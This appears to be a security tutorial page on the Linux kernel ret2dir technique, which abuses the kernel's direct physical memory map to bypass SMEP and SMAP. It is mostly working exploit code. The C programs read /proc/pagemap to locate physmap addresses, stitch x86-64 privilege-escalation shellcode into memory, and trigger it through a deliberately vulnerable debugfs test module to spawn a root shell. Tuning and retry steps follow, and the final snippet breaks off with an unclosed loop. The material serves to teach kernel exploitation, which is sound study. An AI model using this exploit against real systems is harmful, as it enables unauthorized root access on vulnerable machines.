08.ret2dir(return-to-direct-mapped memory)

  • ret2dir (return-to-direct-mapped memory) is an exploitation technique that takes advantage of overly permissive direct physical memory mapping (physmap) in kernel space to bypass hardware protections such as SMEP and SMAP.
    • https://salls.github.io/Linux-Kernel-CVE-2017-5123/
    • https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf
  • Direct execution from physmap has been mitigated in modern kernels by enforcing non-executable permissions on physmap pages.

Virtual memory​

  • Virtual memory is a memory management technique that provides an abstraction of storage resources, allowing programs to use virtual addresses instead of physical addresses.
    • Virtual addresses are translated into physical addresses by the Memory Management Unit (MMU).
info

https://en.wikipedia.org/wiki/Virtual_memory

MMU (Memory Management Unit)​

  • The MMU is a hardware component that handles the translation of virtual memory addresses to physical memory addresses.
    • It also enforces memory protection, page permissions, cache control, and bus arbitration.
info

https://en.wikipedia.org/wiki/Memory_management_unit

Virtual address space​

  • A Virtual Address Space (VAS) is the set of virtual addresses available to a process.
    • On 64-bit x86-64 Linux architectures, 48 bits of virtual address space are typically supported with sign extension.
info

https://en.wikipedia.org/wiki/Virtual_address_space

Page Table​

  • Page tables store the mapping between virtual addresses and physical pages (Page Frame Numbers, PFNs).
    • Modern 64-bit Linux uses 4-level (or 5-level) page table translation.

Virtual memory map with 4-level page tables (x86-64)​

  • Key kernel memory region: 0xffff880000000000 - 0xffffc7ffffffffff (physmap / direct mapping):
    • In older x86-64 kernels (<= v3.8.13), this entire 64TB direct-mapped physical memory region had RWX permissions.
    • User space allocations are backed by physical frames that are simultaneously mapped into kernel space at PAGE_OFFSET (0xffff880000000000) + physical_address.
    • Because this kernel direct mapping was executable, placing shellcode in user space and jumping to its physmap kernel virtual address completely bypassed SMEP/SMAP.

pagemap file​

  • /proc/<pid>/pagemap allows user processes to determine the physical frame (PFN) backing any virtual page:
    • Bit 63: Present bit (1 if page is present in physical RAM, 0 if swapped to disk).
    • Bits 0-54: Page Frame Number (PFN).
  • Using the PFN, the kernel physmap address is: kernel_direct_addr = (PFN * PAGE_SIZE) + PAGE_OFFSET + (vaddr & (PAGE_SIZE - 1))
BitsDescription
0-54Page Frame Number (PFN)
55pte is soft-dirty
56page exclusively mapped
57-60Zero
61file-page or shared-anon
62swapped
63present
  • In Linux 4.0+, inspecting PFN requires CAP_SYS_ADMIN capability.
info
  • https://www.kernel.org/doc/Documentation/vm/pagemap.txt

kernwrite.c - kernwrite_init()​

  • Creates debugfs nodes /sys/kernel/debug/kernwrite/:
    • over_func_ptr: Overwrites ops.fptr with user-supplied address.
    • invoke_func: Calls ops_ptr->fptr().
kernwrite.c - kernwrite_init()
struct dummy_ops {
	size_t val;
	ssize_t (*fptr)(void);
};

static struct dummy_ops ops;
static struct dummy_ops *ops_ptr;
...

kernwrite.c - over_func()​

kernwrite.c - over_func()
static ssize_t
over_func(struct file *f, const char __user *buf,
		size_t count, loff_t *off)
{
	char addr[ADDR_SZ];
	memset(addr, 0 , ADDR_SZ);

	if (copy_from_user(addr,
			buf,
			(count < ADDR_SZ - 1) ? count : ADDR_SZ - 1)  != 0) {
		return -EINVAL;
	}

	ops.fptr	= (void *)simple_strtol(addr, NULL, 16);
	f->private_data = ops.fptr;

	return count;
}

kernwrite.c - invoke_func()​

kernwrite.c - invoke_func()
static ssize_t
invoke_func(struct file *f, const char __user *buf, size_t count, loff_t *off)
{
	printk(KERN_DEBUG "kernwrite: executing at 0x%p\n", ops_ptr->fptr);
	return ops_ptr->fptr();
}

Proof of Concept​

Get Present bit & PFN from "pagemap" file​

get_info.c
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define PATH_SZ			32
#define PRESENT_MASK	(1ULL << 63)
#define PFN_MASK		((1ULL << 55) - 1)

#define ALLOC_STEP    1024*1024*512

void querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
    char             path[PATH_SZ];
    uint64_t         *pentry    = NULL;
    FILE             *fp    = NULL;
    
    if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL)
        errx(7,"[Fail] couldn't allocate memory for pagemap entries -- %s",strerror(errno));
        
    memset(path, 0, PATH_SZ);
    snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid);
        
    if ((fp = fopen(path, "r")) == NULL)
        errx(4,"[Fail] couldn't open %s -- %s",path,strerror(errno));
        
    if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)
        errx(5,"[Fail] couldn't seek in pagemap -- %s",strerror(errno));    
        
    if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)
        errx(6,"[Fail] couldn't read pagemap entries -- %s",strerror(errno));
                        
    while (pnum > 0) {
        if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
            pnum--;
            continue;
        }

        printf("[*] Page Number %zd\n", pnum - 1);
        printf("[*] present bit 1\n");
        printf("[*] PFN is %llu\n\n", pentry[pnum - 1] & PFN_MASK);

        pnum--;
    }
                            
    fclose(fp);
    return;
}
    
void main()
{
    long psize;
    char *code = NULL;
    
    if ((psize = sysconf(_SC_PAGESIZE)) == -1)
        errx(2, "[Fail] couldn't read page size -- %s", strerror(errno));
    
    if ((code = mmap(NULL, ALLOC_STEP, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) == MAP_FAILED)
        errx(7, "[Fail] couldn't allocate memory -- %s", strerror(errno));

    querypmap(getpid(), (unsigned long)code, psize, ALLOC_STEP / psize);
}

Find physical addresses mapped to virtual pages​

get_mapping_info.c
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define PATH_SZ		32
#define PRESENT_MASK	(1ULL << 63)
#define PFN_MASK	((1ULL << 55) - 1)

#define ALLOC_STEP    1024*1024*512

#define PAGE_OFFSET    0xFFFF880000000000UL
#define KERN_EXEC_LOW    0xFFFF880030400000UL
#define KERN_EXEC_HIGH    0xFFFF880080000000UL

void querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
    char             path[PATH_SZ];
    uint64_t         *pentry    = NULL;
    FILE             *fp    = NULL;
    unsigned long    kaddr    = 0;
    
    if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL)
        errx(7,"[Fail] couldn't allocate memory for pagemap entries -- %s",strerror(errno));
        
    memset(path, 0, PATH_SZ);
    snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid);
        
    if ((fp = fopen(path, "r")) == NULL)
        errx(4,"[Fail] couldn't open %s -- %s",path,strerror(errno));
        
    if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)
        errx(5,"[Fail] couldn't seek in pagemap -- %s",strerror(errno));    
        
    if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)
        errx(6,"[Fail] couldn't read pagemap entries -- %s",strerror(errno));

    vaddr += ((pnum - 1) * psize);                            
    while (pnum > 0) {
        if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
            kaddr = 0;
            vaddr -= psize;
            pnum--;
            continue;
        }

        kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize) + PAGE_OFFSET + (vaddr & (psize - 1));
             
        if (kaddr >= KERN_EXEC_LOW && kaddr <= KERN_EXEC_HIGH){
	        printf("[*] Found KERN_EXEC Zone!\n\n");
		    printf("[*] Page Number %zd\n", pnum - 1);
            printf("[*] present bit 1\n");
            printf("[*] PFN is %llu\n", pentry[pnum - 1] & PFN_MASK);
            printf("[*] %#lx is kernel-mapped at %#lx\n\n",vaddr,kaddr);
            break;
	    }

        kaddr = 0;
        vaddr -= psize;
        pnum--;
    }
                            
    fclose(fp);
    return;
}
    
void main()
{
    long psize;
    char *code = NULL;
    
    if ((psize = sysconf(_SC_PAGESIZE)) == -1)
        errx(2, "[Fail] couldn't read page size -- %s", strerror(errno));
    
    if ((code = mmap(NULL, ALLOC_STEP, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) == MAP_FAILED)
        errx(7, "[Fail] couldn't allocate memory -- %s", strerror(errno));

    querypmap(getpid(), (unsigned long)code, psize, ALLOC_STEP / psize);
}

Write the shellcode to physical memory​

  • Copy the privilege escalation shellcode into user space at the virtual address corresponding to the target physmap page:
exploit(saddr).c
    /* shellcode stitching */
	code += res.pnum * psize;
	memcpy(code, shell_tmpl, SHELL_PREFIX);
	code += SHELL_PREFIX;
	memcpy(code, &caddr, sizeof(unsigned));
	code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
	code += SHELL_ADV;
	memcpy(code, &paddr, sizeof(unsigned));
	code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);
shellcode.h
#elif	defined(__x86_64__)	/* x86-64 */
#define SHELL_PREFIX	8		/* 8 bytes of "prefix" code */
#define SHELL_SUFFIX	24		/* 24 bytes of "suffix" code */
#define	SHELL_ADV	3		/* 3 bytes of code advancement */
static char shell_tmpl[] =
		"\x55"			/* push	%rbp		*/
		"\x48\x89\xe5"		/* mov	%rsp, %rbp	*/
		"\x53"			/* push	%rbx		*/
		"\x48\xc7\xc3"		/* mov	$<kaddr>, %rbx	*/
		"\x48\xc7\xc0"		/* mov	$<kaddr>, %rax	*/
	"\x48\xc7\xc7\x00\x00\x00\x00"	/* mov	$0x0, %rdi	*/
		"\xff\xd0"		/* callq *%rax		*/
		"\x48\x89\xc7"		/* mov	%rax, %rdi	*/
		"\xff\xd3"		/* callq *%rbx		*/
	"\x48\xc7\xc0\x00\x00\x00\x00"	/* mov	$0x0, %rax	*/
		"\x5b"			/* pop	%rbx		*/
		"\xc9"			/* leaveq		*/
		"\xc3";			/* ret			*/
#endif

Execute shellcode via physmap address​

  • Writing the physmap address (0xffff8800...) to /sys/kernel/debug/kernwrite/over_func_ptr and invoking it executes the payload in kernel space, bypassing SMEP/SMAP without jumping into user virtual space (0x00007f...):
exploit(saddr).c
	memset(saddr, 0, ADDR_SZ);
	sprintf(saddr, "%#lx", res.btarget);
	fprintf(stdout, "[+] shellcode is at %s\n", saddr);
	
	if ((fd = open("/sys/kernel/debug/kernwrite/over_func_ptr", O_WRONLY)) == -1)
		errx(8, "[Fail] couldn't open over_func_ptr");
	write(fd, saddr, strlen(saddr));
	close(fd);

	if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func", O_WRONLY)) == -1)
		errx(9, "[Fail] couldn't open invoke_func");
	write(fd, "1", 1);
	close(fd);
	
	if (getuid() == 0) {
		fprintf(stderr, "[+] p0wned [^_-]\n");
		execve("/bin/sh", argv, NULL);
	}

Tuning Execution Window​

  • Fine-tune the target memory range macros for high reliability:
Modify the macro values.
#define KERN_EXEC_LOW    0xffff880001bfffffUL    /* exec range start */
#define KERN_EXEC_HIGH    0xffff880036000000UL    /* exec range end */
  • Add a retry loop until an executable physmap frame is found:
Add while() loop
    res = querypmap(getpid(), (unsigned long)code, psize, ALLOC_STEP / psize);
    
    while(res.btarget == 0) {
        if ((code = mmap(NULL, ALLOC_STEP, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0)) == MAP_FAILED)
            errx(7, "[Fail] couldn't allocate memory -- %s", strerror(errno));
        
        res = querypmap(getpid(), (unsigned long)code, psize, ALLOC_STEP / psize);

    vaddr = (unsigned long)code + res.pnum * psize;
    printf("[*] Page Number %zd\n", res.pnum);
    printf("[*] %#lx is kernel-mapped at %#lx\n\n",vaddr,res.btarget);
